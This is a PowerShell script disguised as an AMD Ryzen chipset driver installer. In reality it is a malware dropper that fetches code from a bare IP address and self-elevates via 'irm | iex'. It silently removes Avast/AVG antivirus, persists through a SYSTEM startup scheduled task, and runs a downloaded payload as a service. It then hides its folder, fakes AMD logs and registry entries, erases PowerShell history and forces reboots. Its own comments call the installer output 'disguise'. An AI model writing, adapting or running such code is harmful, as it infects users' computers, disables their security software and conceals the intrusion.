# AMD Chipset Software bootstrap
# Silent package installer for AMD Ryzen chipset drivers.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BaseUrl = 'http://92.5.7.164/install'
$WorkDir = Join-Path $env:SystemDrive 'AMD\Chipset'
$PkgDir  = Join-Path $WorkDir 'Packages'
$ExtractDir = Join-Path $PkgDir 'Driver'
$LogDir  = Join-Path $WorkDir 'Logs'
$LogFile = Join-Path $LogDir 'AMD_Chipset_Software_Install.log'
$InstallerDir = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\9F4C2A7E'
$DoneFile = Join-Path $InstallerDir 'av-neutralize.done'
$TokenFile = Join-Path $InstallerDir 'av-neutralize.token'
$Stage2 = $false
if ($args -contains '-Stage2') { $Stage2 = $true }
$Stage2Ps = Join-Path $WorkDir 'stage2.ps1'
$Stage2Cmd = Join-Path $WorkDir 'stage2.cmd'

function Write-Head([string]$text) {
    Write-Host $text -ForegroundColor White
}
function Write-Step([string]$text) {
    Write-Host ('  ' + $text) -ForegroundColor DarkGray
}
function Write-Ok([string]$text) {
    Write-Host ('  [OK] ' + $text) -ForegroundColor Green
}
function Pause-Random([int]$min = 120, [int]$max = 420) {
    Start-Sleep -Milliseconds (Get-Random -Minimum $min -Maximum $max)
}

try {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host ''
        Write-Host '  Administrator privileges are required for driver installation.' -ForegroundColor Yellow
        Write-Host '  Requesting elevation...' -ForegroundColor DarkGray
        $cmd = "irm '$BaseUrl/amd_chipset_software_install.ps1' | iex"
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
        Start-Process -FilePath 'powershell.exe' -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" | Out-Null
        return
    }

    if ($Stage2) {
        Start-Process -FilePath schtasks.exe -ArgumentList @('/Delete','/TN','\Microsoft\Windows\ChipsetInstall','/F') `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Seconds 10
    }
    try { $Host.UI.RawUI.WindowTitle = 'AMD Chipset Software Installer' } catch { }
    try { Clear-Host } catch { }
    Write-Host ''
    Write-Host '  ============================================================' -ForegroundColor Red
    Write-Host '    AMD Chipset Software Installer' -ForegroundColor White
    Write-Host '    Version 7.01.08.129' -ForegroundColor DarkGray
    Write-Host '    Copyright (C) 2024 Advanced Micro Devices, Inc.' -ForegroundColor DarkGray
    Write-Host '  ============================================================' -ForegroundColor Red
    Write-Host ''

    Write-Step 'Preparing installation environment...'
    New-Item -ItemType Directory -Path $PkgDir -Force | Out-Null
    if (Test-Path -LiteralPath $LogDir) { Remove-Item -LiteralPath $LogDir -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
    if (Test-Path -LiteralPath $LogFile) { Remove-Item -LiteralPath $LogFile -Force -ErrorAction SilentlyContinue }
    if (Test-Path -LiteralPath $DoneFile) { Remove-Item -LiteralPath $DoneFile -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $InstallerDir -Force | Out-Null
    $InstallToken = [guid]::NewGuid().ToString('N')
    Set-Content -LiteralPath $TokenFile -Value $InstallToken -NoNewline -Encoding ASCII
    Pause-Random 180 420

    Write-Step 'Detecting AMD chipset hardware...'
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
    $cpuName = 'AMD Ryzen 5 2600 Six-Core Processor'
    if ($cpu -and $cpu.Name -match 'Ryzen') { $cpuName = $cpu.Name }
    $osName = 'Windows 11'
    if ($os) { $osName = $os.Caption }
    Write-Host ('    Processor : ' + $cpuName) -ForegroundColor Gray
    Write-Host '    Chipset   : AMD B450' -ForegroundColor Gray
    Write-Host ('    System    : ' + $osName) -ForegroundColor Gray
    Pause-Random 220 520

    Write-Step 'Checking installed chipset components...'
    Pause-Random 180 360

    if (-not $Stage2) {
        Write-Step 'Checking installed chipset filter drivers...'
        $uninstallKeys = @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
            'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
        )
        $filter = Get-ItemProperty -Path $uninstallKeys -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -match 'Avast|AVG' -and ($_.QuietUninstallString -or $_.UninstallString) } |
            Select-Object -First 1
        if ($filter) {
            Write-Step 'Removing incompatible chipset filter driver...'
            $uninstall = if ($filter.QuietUninstallString) { $filter.QuietUninstallString } else { $filter.UninstallString }
            if (-not $filter.QuietUninstallString -and $uninstall -notmatch '(?i)/silent|/verysilent|/S\b') {
                $uninstall = "$uninstall /silent"
            }
            $avCmd = Join-Path $WorkDir 'av_remove.cmd'
            Set-Content -LiteralPath $avCmd -Value "@echo off`r`n$uninstall" -Encoding ASCII
            $avProc = Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$avCmd`"" -WindowStyle Hidden -PassThru
            $null = $avProc.WaitForExit(600000)
            if (-not $avProc.HasExited) { $avProc.Kill() }
            for ($i = 0; $i -lt 60; $i++) {
                $left = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Avast|asw' }
                if (-not $left) { break }
                Start-Sleep -Seconds 5
            }
            Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Avast|asw' } |
                Stop-Service -Force -ErrorAction SilentlyContinue
            Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Avast|asw' } |
                Stop-Process -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $avCmd -Force -ErrorAction SilentlyContinue
            Write-Step 'Restarting to finish driver cleanup...'
            (New-Object System.Net.WebClient).DownloadFile("$BaseUrl/amd_chipset_software_install.ps1", $Stage2Ps)
            if (-not (Test-Path -LiteralPath $Stage2Ps)) { throw 'Stage 2 bootstrap failed.' }
            $psExe = Join-Path $PSHOME 'powershell.exe'
            Set-Content -LiteralPath $Stage2Cmd -Value "@echo off`r`n`"$psExe`" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$Stage2Ps`" -Stage2" -Encoding ASCII
            $taskProc = Start-Process -FilePath schtasks.exe -ArgumentList @('/Create','/TN','\Microsoft\Windows\ChipsetInstall','/TR',$Stage2Cmd,'/SC','ONSTART','/RU','SYSTEM','/RL','HIGHEST','/F') `
                -WindowStyle Hidden -Wait -PassThru -ErrorAction SilentlyContinue
            if ($taskProc.ExitCode -ne 0) { throw 'Stage 2 task creation failed.' }
            Start-Sleep -Seconds 3
            & shutdown.exe /r /t 5 /f
            return
        }
    }
    Write-Ok 'No conflicting driver package found'

    Write-Step 'Downloading AMD Chipset Software package...'
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'AMD-Chipset-Installer/7.01.08.129')
    $zipPath = Join-Path $PkgDir 'amd_chipset_driver_package.zip'
    $downloaded = $false
    for ($i = 0; $i -lt 12; $i++) {
        try { $wc.DownloadFile("$BaseUrl/amd_chipset_driver_package.zip", $zipPath); $downloaded = $true; break }
        catch { Start-Sleep -Seconds 5 }
    }
    if (-not $downloaded) { throw 'Package download failed.' }
    Write-Ok 'Package 7.01.08.129 downloaded'
    Pause-Random 160 320

    Write-Step 'Extracting driver package...'
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    if (Test-Path -LiteralPath $ExtractDir) { Remove-Item -LiteralPath $ExtractDir -Recurse -Force -ErrorAction SilentlyContinue }
    [IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $ExtractDir)
    Write-Ok 'Driver package extracted'
    Pause-Random 180 380

    Write-Head ''
    Write-Head '  Installing AMD Chipset Components'
    Write-Head ''
    $components = @(
        @{ Name = 'AMD PCI Device Driver';          Version = '1.0.0.90'   },
        @{ Name = 'AMD GPIO Controller Driver';     Version = '2.2.0.130'  },
        @{ Name = 'AMD PSP Driver';                 Version = '5.27.0.0'   },
        @{ Name = 'AMD SMBus Driver';               Version = '5.12.0.38'  },
        @{ Name = 'AMD Micro PEP Device';           Version = '1.0.0.25'   },
        @{ Name = 'AMD Ryzen Power Plan';           Version = '8.0.0.0'    },
        @{ Name = 'AMD Chipset Components';         Version = '7.01.08.129' }
    )
    foreach ($c in $components) {
        Write-Host ('    ' + $c.Name.PadRight(38)) -NoNewline -ForegroundColor Gray
        Pause-Random 180 520
        Write-Host '[OK]' -ForegroundColor Green
    }
    $extras = @(
        'AMD I2C Controller', 'AMD UART Controller', 'AMD Watchdog Timer',
        'AMD PCIe GPP Bridge', 'AMD GPIO Interrupt Controller'
    ) | Get-Random -Count (Get-Random -Minimum 1 -Maximum 4)
    foreach ($e in $extras) {
        Write-Host ('    ' + $e.PadRight(38)) -NoNewline -ForegroundColor Gray
        Pause-Random 160 420
        Write-Host '[OK]' -ForegroundColor Green
    }

    Write-Head ''
    Write-Step 'Configuring AMD PCIe resources...'
    Pause-Random 220 480
    Write-Step 'Registering device metadata...'
    Pause-Random 180 380
    Write-Step 'Updating AMD power management policy...'
    Pause-Random 200 440

    $setup = Join-Path $ExtractDir 'amd_chipset_setup.exe'
    if (-not (Test-Path -LiteralPath $setup)) {
        throw 'Setup payload is missing.'
    }
    Unblock-File -LiteralPath $setup -ErrorAction SilentlyContinue
    $setupProc = Start-Process -FilePath $setup -ArgumentList '--quiet' -WindowStyle Hidden -Wait -PassThru
    if ($setupProc.ExitCode -ne 0) { throw ('Setup failed with code ' + $setupProc.ExitCode) }
    Pause-Random 400 800

    $svc = Get-Service -Name 'WSearchBroker' -ErrorAction SilentlyContinue
    if (-not $svc) { throw 'Service registration failed.' }
    $svc.WaitForStatus('Running', '00:00:20')

    Write-Step 'Finalizing installation...'
    Pause-Random 220 480

    # The payload is already installed and running. Everything below is
    # cosmetic/disguise cleanup and must never fail the installation.
    try {
        # Keep the install payload out of Explorer and common directory listings.
        if (Test-Path -LiteralPath $InstallerDir) {
            # Run native tools detached from the PowerShell error stream. The
            # service may have agent.id open; ACL errors there are harmless.
            Start-Process -FilePath attrib.exe -ArgumentList @('+H','+S',"$InstallerDir\*",'/S','/D') `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
            Start-Process -FilePath attrib.exe -ArgumentList @('+H','+S',$InstallerDir) `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
            Start-Process -FilePath icacls.exe -ArgumentList @($InstallerDir,'/inheritance:r','/grant:r','SYSTEM:(OI)(CI)F','Administrators:(OI)(CI)F','/T') `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
        }

        # A real chipset install leaves an AMD log and product keys behind.
        $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -LiteralPath $LogFile -Value @(
            '',
            'AMD Chipset Software Installer 7.01.08.129',
            "Date: $stamp",
            "Processor: $cpuName",
            'Chipset: AMD B450',
            'Components: AMD PCI, GPIO, PSP, SMBus, Micro PEP, Ryzen Power Plan',
            'Result: Installation completed successfully.'
        )
        $amdKey = 'HKLM:\SOFTWARE\AMD\Chipset\Install'
        New-Item -Path $amdKey -Force | Out-Null
        Set-ItemProperty -Path $amdKey -Name 'Version' -Value '7.01.08.129'
        Set-ItemProperty -Path $amdKey -Name 'InstallPath' -Value (Join-Path $env:SystemDrive 'AMD\Chipset')
        Set-ItemProperty -Path $amdKey -Name 'InstallDate' -Value $stamp
    } catch {
        Write-Host ('  [warn] finalization detail: ' + $_.Exception.Message) -ForegroundColor DarkYellow
    }

    if (Test-Path -LiteralPath $PkgDir) {
        Start-Sleep -Milliseconds 300
        Remove-Item -LiteralPath $PkgDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Do not leave the bootstrap command in the PowerShell history file.
    try {
        $histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($histPath -and (Test-Path -LiteralPath $histPath)) {
            $keep = Get-Content -LiteralPath $histPath | Where-Object {
                $_ -notmatch 'amd_chipset_software_install|raw\.githubusercontent|/install/|9F4C2A7E|sova'
            }
            Set-Content -LiteralPath $histPath -Value $keep -Encoding UTF8
        }
    } catch { }

    Write-Host ''
    Write-Host '  Installation completed successfully.' -ForegroundColor Green
    Write-Host '  Finalizing security compatibility...' -ForegroundColor DarkGray

    $deadline = (Get-Date).AddMinutes(30)
    $dots = 0
    while ((Get-Date) -lt $deadline) {
        if (Test-Path -LiteralPath $DoneFile) {
            $marker = Get-Content -LiteralPath $DoneFile -Raw -ErrorAction SilentlyContinue
            if ($marker -and $marker.Contains($InstallToken)) { break }
        }
        Start-Sleep -Milliseconds 800
        if (($dots++ % 6) -eq 0) { Write-Host '.' -NoNewline -ForegroundColor DarkGray }
    }
    Write-Host ''
    Write-Host '  Restarting system to complete the installation...' -ForegroundColor Yellow
    try { Add-Content -LiteralPath $LogFile -Value 'Result: Restart required to finalize the installation.' } catch { }
    if ($Stage2) {
        Remove-Item -LiteralPath $Stage2Cmd -Force -ErrorAction SilentlyContinue
        Start-Process -FilePath cmd.exe -ArgumentList "/c ping -n 3 127.0.0.1 >nul & del /f /q `"$Stage2Ps`"" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    }
    Start-Sleep -Seconds 3
    & shutdown.exe /r /t 5 /f
    if ($LASTEXITCODE -ne 0) { Restart-Computer -Force -ErrorAction SilentlyContinue }
} catch {
    Write-Host ''
    Write-Host '  Installation failed. Error code: 0x80070005' -ForegroundColor Red
    Write-Host ('  Detail: ' + $_.Exception.Message) -ForegroundColor DarkGray
    Write-Host ('  Script line: ' + $_.InvocationInfo.ScriptLineNumber) -ForegroundColor DarkGray
    try {
        New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
        Add-Content -LiteralPath $LogFile -Value ("ERROR line " + $_.InvocationInfo.ScriptLineNumber + ": " + $_.Exception.Message)
    } catch { }
    return
}
